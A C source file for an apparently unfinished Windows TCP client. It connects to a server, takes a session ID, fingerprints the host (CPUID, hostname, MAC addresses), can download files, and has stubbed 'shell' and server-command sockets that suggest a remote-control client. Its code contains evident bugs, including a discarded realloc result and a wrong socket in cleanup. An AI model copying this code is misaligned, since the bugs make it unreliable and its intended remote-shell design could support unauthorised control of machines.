/**********************************************************/
/* Client_Win.c                                           */
/* Provides IPv4 or IPv6 TCP connections for *Nix devices */
/**********************************************************/

/* Unique Headers */
#include <winsock2.h>
#include <ws2tcpip.h>
/* IP_ADAPTER_INFO && PIP_ADAPTER_INFO */
#include <iphlpapi.h> 

#include "Client_Utilities.h"
#include "cpuid.h"

// Link with ws2_32.lib <- Not sure if this is required? -> It is...
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")

/* One day this will have a .h file */
int create_socket(char* srv_addr, char* srv_port, int int_sock);
int cleanup_socket(int socket_descriptor);

int get_connection_information(int socket_descriptor, struct addrinfo* AI);
int get_mac_address(char* network_address);

int send_message(int socket_descriptor, char* buffer, size_t buffer_size);
int recv_message(int socket_descriptor, char* buffer, size_t buffer_size);
int echo_recv(int socket_descriptor);
int recv_file(conn_info* srv_info, char* file_name, int file_size);

int build_cmd_socket(conn_info* srv_info);

/* This will contain the main loop that responds to commands from the server */
int main(int argc, char* argv[])
{
    int ret_val = 0;
    int i = 0;
    void* buffer = malloc(10);

    int cpuid_flags;
    char hostname[256] = { '\0' };

    conn_info* srv_info = malloc(sizeof(conn_info));
    if (srv_info == NULL) {
        fprintf(stderr, "Failed to malloc conn_info\n");
        ret_val = -1;
        goto exit;
    }
    memset(srv_info, 0, sizeof(conn_info));

    if ((srv_info = menu(argc, argv)) == NULL) {
        fprintf(stderr, "Failed to get input from menu\n");
        ret_val = -1;
        goto exit;
    }

    ret_val = build_cmd_socket(srv_info);
    if (ret_val == -1) {
        fprintf(stderr, "build_cmd_socket failed\n");
        goto exit;
    }

    cpuid_flags = get_cpuid_flags();
    printf("\nCPUID: %d\n", cpuid_flags);
    gethostname(hostname, 256);
    printf("Hostname: %s\n\n", hostname);

    get_mac_address(hostname);

    //recv_file(srv_info, "tmp.txt", 200);

    printf("Starting cmd loop\n");
    //ret_val = 0;
    //while (ret_val == 0) {
        //printf("Loop: %d\n", i);
        //i++;
        ret_val = echo_recv(srv_info->cmd_socket);
    //} 

    /* Clean Exit */
exit:
    if (srv_info != NULL) {
        if (-1 < srv_info->cmd_socket) {
            cleanup_socket(srv_info->cmd_socket);
        }
        if (-1 < srv_info->data_socket) {
            cleanup_socket(srv_info->data_socket);
        }
        if (-1 < srv_info->shell_socket) {
            cleanup_socket(srv_info->data_socket);
        }
    }
    free(srv_info);
    printf("Clean Exit\n");
    exit(ret_val);
}

/*  build_cmd_socket
* By the end of this function, should have a cmd_socket and session_uuid set in the conn_info struct
*
* @conn_info* srv_info: Relevent conn_info struct that holds server information.
*
* @Returns: -1 on failure, otherwise 0
*/
int build_cmd_socket(conn_info* srv_info)
{

    int ret_val = 0;

    char *buffer = malloc(BUFFER);
    if (buffer == NULL) {
        fprintf(stderr, "Build_cmd_socket: buffer Malloc failed - NULL\n");
        ret_val = -1;
        goto exit;
    }
    memset(buffer, 0, BUFFER);

    srv_info->cmd_socket = create_socket(srv_info->srv_addr, srv_info->srv_port, srv_info->int_sock);
    if (srv_info->cmd_socket == -1) {
        ret_val = -1;
        goto exit;
    }
    //printf("cmd_socket successfully set: %d\n", srv_info->cmd_socket);

    /* Send empty session_uuid (0000) and recv actual session_uuid */
    ret_val = send(srv_info->cmd_socket, srv_info->session_uuid, UUID, 0);
    if (ret_val == -1) {
        fprintf(stderr, "Build_cmd_socket: Failed to send message\n");
        goto exit;
    }
    ret_val = recv(srv_info->cmd_socket, buffer, UUID, 0);
    if (ret_val == -1) {
        fprintf(stderr, "Build_cmd_socket: Failed to recv message\n");
        goto exit;
    }
    /*
    else {
        printf("Message: %s", buffer);
    } */
    strncpy_s(srv_info->session_uuid, UUID, buffer, UUID);
    printf("Session UUID succesfully set: %s\n", srv_info->session_uuid);

exit:
    free(buffer);
    return ret_val;
}

int echo_recv(int socket_descriptor)
{
    int ret_val = 0;
    void* buffer = malloc(10);
    if (buffer == NULL) {
        fprintf(stderr, "Malloc failed");
        ret_val = -1;
        goto exit;
    }

    ret_val = recv(socket_descriptor, buffer, 10, 0);
    if (-1 == ret_val) {
        fprintf(stderr, "recv() failed with error %d\n", ret_val);
        goto exit;
    } 

    ret_val = send(socket_descriptor, buffer, 10, 0);
    if (-1 == ret_val) {
        fprintf(stderr, "send() failed with error %d\n", ret_val);
        goto exit;
    }

exit:
    return ret_val;
}

/*  build_shell_socket
*
*
*
*/
int build_shell_socket(conn_info* srv_info)
{
    return 0;
}

/*  build_data_socket
*
*
*
*/
int build_data_socket(conn_info* srv_info)
{
    return 0;
}

/* create_socket
* Does the leg work to build a socket with some basic error handling 
* 
* @char* srv_addr: The address to connect to
* @char* srv_port: The port to connect to
* @int int_sock: The type of socket to build (1: Stream; 2: DGRAM; 3: Raw)
* 
* @Returns: if successful, returns an int socket descriptor, otherwise -1
*/
int create_socket(char* srv_addr, char* srv_port, int int_sock)
{
    WSADATA wsaData;

    /* Variables */
    int socket_descriptor = -1;
    int ret_val = -1;

    struct addrinfo hints, *addr_info, *AI;
    //struct socket socket_descriptor = INVALID_SOCKET; // incomplete type is not allowed?

    // Ask for Winsock
    if ((ret_val = WSAStartup(MAKEWORD(1, 1), &wsaData)) != 0) {
        fprintf(stderr, "WSAStartup failed with error %d\n", ret_val);
        WSACleanup();
        return -1;
    }

    // Set the addrinfo struct to 0s
    memset(&hints, 0, sizeof(hints));
    hints.ai_flags      = AI_NUMERICSERV; // Will not resolve server name
    hints.ai_flags     |= AI_NUMERICHOST; // Will not resolve host name
    hints.ai_family     = AF_UNSPEC;
    hints.ai_socktype   = int_sock;      // 1: STREAM, 2: DGRAM, 3: RAW

    // Get address information
    ret_val = getaddrinfo(srv_addr, srv_port, &hints, &addr_info);
    if (ret_val != 0) {
        fprintf(stderr, "Cannot resolve address %s:%s, error %d\n", srv_addr, srv_port, ret_val);
        WSACleanup();
        return -1;
    }

    /* MAKE THIS A FUNCTION? -> Attempts to build connection, returns NULL if fails otherwise AI will have a valid struct*/
    // The Arrow(->) operator exists to access the members of the structure or the unions using pointers.
    // getaddrinfo returns one or more addrinfo structs, try each until success
    for (AI = addr_info; AI != NULL; AI = AI->ai_next) {

        // Open socket
        if ((socket_descriptor = socket(AI->ai_family, AI->ai_socktype, AI->ai_protocol)) < 0) {
            fprintf(stderr, "Building socket descriptor with socket() failed, error %d\n", socket_descriptor);
        }

        printf("Successful socket call > family: %d | socktype: %d | protocol: %d\n", AI->ai_family, AI->ai_socktype, AI->ai_protocol);

        // Establish connection to server (sets up remote mapping if DGRAM)
        // printf("Attempting to connect to %s:%s\n", srv_addr, srv_port);

        // If the connection fails, try the next addrinfo struct otherwise break
        if ((ret_val = connect(socket_descriptor, AI->ai_addr, AI->ai_addrlen)) < 0) {
            fprintf(stderr, "Connect() failed, error %d\n", ret_val);
            closesocket(socket_descriptor);
        } 
        else break;
    }
    /* MAKE THIS A FUNCTION END? */

    // Attempted all the addrinfo structs but made no valid connections
    if (AI == NULL) {
        fprintf(stderr, "Fatal: unable to connect to server.\n");
        WSACleanup();
        return -1;
    }

    // Finished with addrinfo chain
    freeaddrinfo(addr_info);

    get_connection_information(socket_descriptor, AI);

    return socket_descriptor;
}

/* get_mac_address
* Iterates over the available network adapaters and returns the MAC assocated with the address provided. AF_UNSPEC SAFE!!!
* Alternatively, could probably use ARP
* 
* @char * network_address: 
* 
* @returns: -1 on fail.
* 
*/
int get_mac_address(char * network_address)
{
    int ret_val = 0;
    unsigned int i = 0;
    char hw_str[HWADDRSIZE] = { 0 };
    char two_bytes[3] = { 0 };

    socklen_t addr_len = 0;
    char addr_str[MAXADDRSIZE] = { 0 };
    struct sockaddr_storage addr = { 0 };
    addr_len = sizeof(addr);

    ULONG flags = 0x0010; // GAA_FLAG_INCLUDE_PREFIX (Show IPv4 and IPv6)
    ULONG family = AF_UNSPEC; // 0

    PIP_ADAPTER_INFO ptr_addresses = NULL;
    ULONG out_buf_len = 0;

    PIP_ADAPTER_ADDRESSES ptr_current_addresses = NULL;
    PIP_ADAPTER_UNICAST_ADDRESS ptr_unicast_address = NULL;

    out_buf_len = sizeof(IP_ADAPTER_ADDRESSES);
    ptr_addresses = (IP_ADAPTER_ADDRESSES*)malloc(out_buf_len); 

    // Ensure ptr_addresses size is correct
    if (GetAdaptersAddresses(family, flags, NULL, ptr_addresses, &out_buf_len) == ERROR_BUFFER_OVERFLOW) {
        realloc(ptr_addresses, out_buf_len);
    }
    if (ptr_addresses == NULL) {
        fprintf(stderr, "Failed to malloc/realloc for GetAdaptersAddresses(), error: %d", ret_val);
        ret_val = -1;
        goto exit;
    }

    printf("Memory allocated for GetAdapterAddresses = %d bytes\n", out_buf_len);
    // Actually call GetAdaptersAddresses for data
    ret_val = GetAdaptersAddresses(family, flags, NULL, ptr_addresses, &out_buf_len);
    if (ret_val == NO_ERROR) { // NO_ERROR == 0
        ptr_current_addresses = ptr_addresses;
        while (ptr_current_addresses) {
            ptr_unicast_address = ptr_current_addresses->FirstUnicastAddress;
            while (ptr_unicast_address != NULL) {
                addr = *(struct sockaddr_storage*)ptr_unicast_address->Address.lpSockaddr;
                getnameinfo((struct sockaddr*)&addr, addr_len, addr_str, sizeof(addr_str), NULL, 0, NI_NUMERICHOST | NI_NUMERICSERV);
                printf("Unicast: %s\n", addr_str);
                ptr_unicast_address = ptr_unicast_address->Next;
            }
            if (ptr_current_addresses->PhysicalAddressLength != 0) {
                printf("\tPhysical: ");
                for (i = 0; i < ptr_current_addresses->PhysicalAddressLength;
                    i++) {
                    if (i == (ptr_current_addresses->PhysicalAddressLength - 1))
                        sprintf_s(two_bytes, 3, "%.2X\0",
                            (int)ptr_current_addresses->PhysicalAddress[i]);
                    else
                        sprintf_s(two_bytes, 3, "%.2X",
                            (int)ptr_current_addresses->PhysicalAddress[i]);
                    strncat_s(hw_str, HWADDRSIZE, two_bytes, 2);
                }
                printf("%s\n", hw_str);
                memset(hw_str, 0, HWADDRSIZE);
            }
            ptr_current_addresses = ptr_current_addresses->Next;
        }
    }
    else {
        fprintf(stderr, "GetAdapterAddresses failed, error: %d", ret_val);
        ret_val = -1;
        goto exit;
    }

    ret_val = 0;

exit:
    free(ptr_addresses);
    return ret_val;
}

/*  get_connection_information
* Provides various socket information like local & remote IP:PORT along with protocol family (IPv4/6)
*
* @int socket_descriptor: The socket to interact with
* @struct addrinfo* AI: The pointer to an addrinfo struct that will hold the relevent information
* 
* @returns: -1 on failure, 0 on success
*/
int get_connection_information(int socket_descriptor, struct addrinfo* AI)
{
    int ret_val;
    socklen_t addr_len;
    struct sockaddr_storage Addr;
    char addr_str[MAXADDRSIZE];

    addr_len = sizeof(Addr);
    if ((ret_val = getpeername(socket_descriptor, (struct sockaddr*)&Addr, &addr_len)) < 0) {
        fprintf(stderr, "getpeername() failed, error %d\n", ret_val);
        return -1;
    }
    else {
        getnameinfo((struct sockaddr*)&Addr, addr_len, addr_str, sizeof(addr_str), NULL, 0, NI_NUMERICHOST | NI_NUMERICSERV);
        printf("Connected to %s:%d via %s over %s\n",
            addr_str, ntohs(SS_PORT(&Addr)),
            (AI->ai_socktype == SOCK_STREAM) ? "TCP" : "UDP",
            (AI->ai_family == PF_INET) ? "PF_INET" : "PF_INET6");
    }

    if ((ret_val = getsockname(socket_descriptor, (struct sockaddr*)&Addr, &addr_len)) < 0) {
        fprintf(stderr, "getsockname() failed with error %d\n", ret_val);
        return -1;
    }
    else {
        getnameinfo((struct sockaddr*)&Addr, addr_len, addr_str, sizeof(addr_str), NULL, 0, NI_NUMERICHOST | NI_NUMERICSERV);
        printf("Using local socket %s:%d\n",
            addr_str, ntohs(SS_PORT(&Addr)));
    }
    return 0;
}

/*  send_message
* Send data via a socket
* 
* @int socket_descriptor: The socket to be used
* @char* buffer: The data to be sent
* @size_t buffer_size: The size of the data to be sent
* 
* @Returns: -1 on failure, otherwise the number of bytes sent
*/
int send_message(int socket_descriptor, char* buffer, size_t buffer_size)
{
    int ret_val = 0;
    ret_val = send(socket_descriptor, buffer, buffer_size, 0);
    if (-1 == ret_val) {
        fprintf(stderr, "send() failed with error %d\n", ret_val);
    }
    return ret_val;
}


/* THIS IS USELESS CODE LOL */
/*  recv_message
* Receive data  via a socket
* 
* @int socket_descriptor: The socket to be used
* @char* buffer: The buffer to save the data in
* @size_t buffer_size: The amount of data to receive
* 
* @Returns: -1 on failure, otherwise the number of bytes.
*/
int recv_message(int socket_descriptor, char* buffer, size_t buffer_size)
{
    int recv_amount;

    recv_amount = recv(socket_descriptor, buffer, buffer_size, 0);
    if (-1 == recv_amount) {
        fprintf(stderr, "recv() failed with error %d\n", recv_amount);
    } /*
    else if (0 == recv_amount) {
        printf("Recevied 0\n");
    }
    else {
        printf("Message: %s\n", buffer);
    } */

    return recv_amount;
}

/*  cleanup_socket
* Shuts down, closes, and performs a WSACleanup on a socket
*
* @int socket_descriptor: The socket to be closed
* 
* Returns: 0... (not sure what to error handle in this)
*/
int cleanup_socket(int socket_descriptor)
{
    shutdown(socket_descriptor, SD_SEND);
    closesocket(socket_descriptor);
    WSACleanup();
    printf("Cleaned up Socket\n");
    return 0;
}

/*  recv_file
*
*
*
*/
int recv_file(conn_info* srv_info, char *file_name, int file_size)
{
    int i;
    int ret_val = 0;
    int bytes_recvd = 0;
    FILE* new_file = NULL;

    void* recv_buffer = malloc(BUFFER);
    if (recv_buffer == NULL) {
        fprintf(stderr, "recv_file: failed to malloc buffer");
        ret_val = -1;
        goto exit;
    }

    ret_val = fopen_s(&new_file, file_name, "wb");
    if (new_file == NULL) {
        fprintf(stderr, "Failed to open file %s", file_name);
        ret_val = -1;
        goto exit;
    }

    srv_info->data_socket = create_socket(srv_info->srv_addr, srv_info->srv_port, srv_info->int_sock);
    if (-1 == srv_info->data_socket) {
        printf("Failed to build socket for file download: %s", file_name);
        ret_val = -1;
        goto exit;
    }

    // Send UUID and expected file?
    ret_val = send(srv_info->data_socket, srv_info->session_uuid, UUID, 0);
    if (-1 == ret_val) {
        fprintf(stderr, "recv_file: UUID send() failed with error %d\n", ret_val);
        goto exit;
    }
    ret_val = send(srv_info->data_socket, file_name, strlen(file_name) + 1, 0);
    if (-1 == ret_val) {
        fprintf(stderr, "recv_file: file_name send() failed with error %d\n", ret_val);
        goto exit;
    }

    printf("Socket established and ACK for %s sent\n", file_name);

    for (i = 0; i < file_size; i += bytes_recvd) {
        bytes_recvd = recv(srv_info->data_socket, recv_buffer, BUFFER, 0);
        if (-1 == bytes_recvd) {
            fprintf(stderr, "recv() failed with error %d\n", bytes_recvd);
            ret_val = -1;
            goto exit;
        }
        else if (0 == bytes_recvd) {
            printf("Reached end of file\n");
        }
        fwrite(recv_buffer, BUFFER, 1, new_file);
    }

exit:
    if (new_file != NULL) {
        fclose(new_file);
    }
    if (srv_info->data_socket != -1) {
        cleanup_socket(srv_info->data_socket);
        srv_info->data_socket = -1;
    }
    free(recv_buffer);
    return ret_val;

}